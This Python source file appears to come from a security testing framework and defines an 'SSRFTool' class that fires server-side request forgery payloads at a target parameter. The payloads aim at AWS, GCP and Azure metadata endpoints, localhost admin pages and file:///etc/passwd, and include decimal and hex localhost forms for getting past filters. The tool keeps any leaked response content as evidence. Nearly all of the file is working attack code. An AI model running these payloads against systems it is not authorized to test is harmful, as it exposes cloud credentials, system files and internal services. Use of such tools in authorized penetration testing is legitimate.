"""
SSRFTool â€” Server-Side Request Forgery exploitation.

Tests for:
- Internal service access (cloud metadata, internal APIs)
- Protocol smuggling (file://, gopher://, dict://)
- Blind SSRF with out-of-band detection
- Redirect-based SSRF bypass
"""
import asyncio
import aiohttp
from dataclasses import dataclass

from sentinel.tools.base import ToolOutput
from sentinel.logging_config import get_logger

logger = get_logger(__name__)


@dataclass
class SSRFPayload:
    name: str
    url_payload: str
    detection_method: str  # "response_content", "timing", "oob"
    expected_indicator: str


class SSRFTool:
    name = "ssrf_exploit"
    description = "Test for Server-Side Request Forgery vulnerabilities"

    PAYLOADS = [
        SSRFPayload("aws_metadata", "http://169.254.169.254/latest/meta-data/", "response_content", "ami-id"),
        SSRFPayload("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "response_content", "attributes"),
        SSRFPayload("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "response_content", "compute"),
        SSRFPayload("localhost_http", "http://127.0.0.1:80/", "response_content", "<html"),
        SSRFPayload("localhost_admin", "http://127.0.0.1:8080/admin", "response_content", "admin"),
        SSRFPayload("file_etc_passwd", "file:///etc/passwd", "response_content", "root:"),
        SSRFPayload("decimal_ip", "http://2130706433/", "response_content", ""),
        SSRFPayload("ipv6_localhost", "http://[::1]/", "response_content", ""),
        SSRFPayload("redirect_bypass", "http://0x7f000001/", "response_content", ""),
    ]

    async def execute(
        self,
        target_url: str,
        param_name: str,
        method: str = "GET",
        additional_params: dict = None,
        headers: dict = None,
        custom_payloads: list = None,
    ) -> ToolOutput:
        payloads = custom_payloads or self.PAYLOADS
        findings = []
        http_traces = []

        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                try:
                    params = dict(additional_params or {})
                    params[param_name] = payload.url_payload

                    if method.upper() == "GET":
                        async with session.get(
                            target_url, params=params, headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as resp:
                            body = await resp.text()
                            trace = {
                                "method": "GET", "url": str(resp.url),
                                "status": resp.status, "body": body[:2000],
                                "payload": payload.name,
                            }
                    else:
                        async with session.post(
                            target_url, data=params, headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as resp:
                            body = await resp.text()
                            trace = {
                                "method": "POST", "url": str(resp.url),
                                "status": resp.status, "body": body[:2000],
                                "payload": payload.name,
                            }

                    http_traces.append(trace)

                    if payload.expected_indicator and payload.expected_indicator in body:
                        findings.append({
                            "payload": payload.name,
                            "url_payload": payload.url_payload,
                            "evidence": body[:500],
                            "detection": payload.detection_method,
                        })
                        logger.info(f"SSRF confirmed with payload: {payload.name}")

                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    logger.debug(f"SSRF payload {payload.name} failed: {e}")

        return ToolOutput(
            success=len(findings) > 0,
            data={"findings": findings},
            tool_name=self.name,
            metadata={
                "total_payloads_tested": len(payloads),
                "successful_payloads": len(findings),
                "http_traces": http_traces,
            },
        )
